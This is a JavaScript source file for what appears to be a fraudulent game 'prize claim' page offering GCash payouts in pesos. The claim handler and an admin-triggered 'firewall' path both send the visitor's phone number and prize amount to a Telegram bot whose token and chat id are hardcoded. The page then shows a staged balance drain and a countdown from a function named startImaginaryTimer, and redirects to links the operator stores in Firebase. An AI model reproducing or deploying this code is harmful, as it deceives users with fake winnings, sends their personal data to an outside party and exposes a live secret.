let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

// ========== TEMPLATE CONFIGURATION ==========
const TEMPLATE_URL = "https://xjiligames.github.io/rewards/images/temp_SA.png";

const QR_POSITION = {
    x: 0.51,
    y: 0.71,
    width: 0.30,
    height: 0.30
};

const PRIZE_POSITION = {
    x: 0.52,
    y: 0.25,
    fontSize: 0.04
};

// ========== GET LATEST PAYOUT LINK FROM FIREBASE ==========
async function getLatestPayoutLink() {
    const db = firebase.database();
    const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
    if (snapshot.exists()) {
        const key = Object.keys(snapshot.val())[0];
        const linkData = snapshot.val()[key];
        return linkData.url;
    }
    return null;
}

// ========== GENERATE TEMPLATE IMAGE ==========
async function generateTemplateImage(amount, canvasId) {
    const canvas = document.getElementById(canvasId);
    if (!canvas) {
        console.error("Canvas not found:", canvasId);
        return null;
    }
    
    const ctx = canvas.getContext('2d');
    const qrLink = await getLatestPayoutLink();
    
    return new Promise((resolve, reject) => {
        const img = new Image();
        img.crossOrigin = "Anonymous";
        img.src = TEMPLATE_URL;
        
        img.onload = async function() {
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            
            // Add QR Code
            if (qrLink && typeof QRCode !== 'undefined') {
                try {
                    const qrCanvas = document.createElement('canvas');
                    const qrSize = canvas.width * QR_POSITION.width;
                    await QRCode.toCanvas(qrCanvas, qrLink, { width: qrSize, margin: 1 });
                    const qrX = (canvas.width * QR_POSITION.x) - (qrSize / 2);
                    const qrY = (canvas.height * QR_POSITION.y) - (qrSize / 2);
                    ctx.drawImage(qrCanvas, qrX, qrY, qrSize, qrSize);
                } catch(e) { console.error("QR error:", e); }
            }
            
            // Add Prize Amount
            const prizeX = canvas.width * PRIZE_POSITION.x;
            const prizeY = canvas.height * PRIZE_POSITION.y;
            const fontSize = canvas.width * PRIZE_POSITION.fontSize;
            ctx.font = `bold ${fontSize}px 'Orbitron', 'Arial', sans-serif`;
            ctx.fillStyle = "#ffd700";
            ctx.shadowColor = "black";
            ctx.shadowBlur = 5;
            ctx.textAlign = "center";
            ctx.fillText(`₱${amount.toLocaleString()}`, prizeX, prizeY);
            ctx.shadowColor = "transparent";
            
            resolve(canvas.toDataURL('image/png'));
        };
        
        img.onerror = function() {
            canvas.width = 300;
            canvas.height = 200;
            ctx.fillStyle = "#333";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#ff8888";
            ctx.font = "14px Arial";
            ctx.textAlign = "center";
            ctx.fillText("Failed to load template", canvas.width/2, canvas.height/2);
            reject(new Error("Template load failed"));
        };
    });
}

// ========== FIREWALL FUNCTIONS ==========
async function isFirewallActive() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/globalFirewall').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) { return false; }
    }
    return false;
}

async function sendVerificationRequestNotification(phone, amount) {
    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
    try { await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`); } catch(e) {}
}

// ========== MAIN CLAIM POPUP ==========
async function showClaimPopup(amount) {
    const firewallActive = await isFirewallActive();
    if (firewallActive) {
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        await sendVerificationRequestNotification(userPhone, amount);
        if (typeof window.showFirewallPopup === 'function') window.showFirewallPopup();
        return;
    }
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() { const p = document.getElementById('claimPopup'); if (p) p.style.display = 'none'; }
function showPendingStatus() { const pa = document.getElementById('pendingStatusArea'); if (pa) pa.style.display = 'block'; claimState.isPending = true; }
function hidePendingStatus() { const pa = document.getElementById('pendingStatusArea'); if (pa) pa.style.display = 'none'; claimState.isPending = false; }

function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    claimState.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');
    if (!timerSpan) return;
    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) { remaining--; const mins = Math.floor(remaining / 60); const secs = remaining % 60; timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`; }
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) window.parent.updateGameBalance(originalAmount);
            else if (typeof updateGameBalance === 'function') updateGameBalance(originalAmount);
            else if (typeof GameState !== 'undefined') { GameState.balance = originalAmount; if (typeof updateUI === 'function') updateUI(); if (typeof saveData === 'function') saveData(); }
            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';
            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) { claimState.hasRedirected = true; window.location.href = redirectUrl; }
    }, 1000);
}

function onClaimAction() {
    if (claimState.isProcessing) return;
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`).catch(e => {});
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: amount, claimedAt: Date.now() });
                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount);
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; claimState.isProcessing = false; }, 3000);
                alert("No available rewards!");
            }
        }).catch(() => {
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; claimState.isProcessing = false; }, 3000);
        });
    }
}

// ========== PRIZE POPUP (PAYOUT BUTTON) ==========
async function showPrizePopup() {
    const amount = claimState.currentAmount;
    if (!amount || amount === 0) {
        alert("No prize amount available! Please complete the game first.");
        return;
    }
    
    const popup = document.getElementById('prizePopup');
    if (!popup) {
        alert("Prize popup not found!");
        return;
    }
    
    popup.style.display = 'flex';
    
    const container = document.getElementById('prizeImageContainer');
    if (container) {
        container.innerHTML = '<div style="padding:20px; text-align:center; color:#aaa;">Loading your prize image...</div>';
    }
    
    try {
        await generateTemplateImage(amount, 'prizeDisplayCanvas');
        console.log("✅ Image generated successfully");
    } catch (error) {
        console.error("Image generation error:", error);
        if (container) {
            container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Failed to load image. Please try again.</div>';
        }
    }
}

function hidePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
}

document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatus();
    updatePayoutButtonState();
    
    // Listen for changes in links node
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        db.ref('links').on('value', function() {
            updatePayoutButtonState();
        });
    }
});

// ========== CHECK IF LINK EXISTS IN ADMIN ==========
async function hasAvailableLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return false;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        return snapshot.exists();
    } catch (error) {
        return false;
    }
}

// ========== UPDATE PAYOUT BUTTON STATE ==========
async function updatePayoutButtonState() {
    const payoutBtn = document.getElementById('payoutBtn');
    if (!payoutBtn) return;
    
    const hasLink = await hasAvailableLink();
    
    if (hasLink) {
        payoutBtn.disabled = false;
        payoutBtn.style.opacity = '1';
        payoutBtn.style.cursor = 'pointer';
        payoutBtn.title = 'Click to view your prize';
    } else {
        payoutBtn.disabled = true;
        payoutBtn.style.opacity = '0.5';
        payoutBtn.style.cursor = 'not-allowed';
        payoutBtn.title = 'No payout link available. Please wait for admin to deploy a link.';
    }
}

// ========== MODIFIED SHOW PRIZE POPUP ==========
async function showPrizePopup() {
    // Check if link exists first
    const hasLink = await hasAvailableLink();
    if (!hasLink) {
        alert("No payout link available. Please wait for admin to deploy a link.");
        return;
    }
    
    const amount = claimState.currentAmount;
    if (!amount || amount === 0) {
        alert("No prize amount available! Please complete the game first.");
        return;
    }
    
    const popup = document.getElementById('prizePopup');
    if (!popup) {
        alert("Prize popup not found!");
        return;
    }
    
    popup.style.display = 'flex';
    
    const container = document.getElementById('prizeImageContainer');
    if (container) {
        container.innerHTML = '<div style="padding:20px; text-align:center; color:#aaa;">Loading your prize image...</div>';
    }
    
    try {
        await generateTemplateImage(amount, 'prizeDisplayCanvas');
        console.log("✅ Image generated successfully");
    } catch (error) {
        console.error("Image generation error:", error);
        if (container) {
            container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Failed to load image. Please try again.</div>';
        }
    }
}
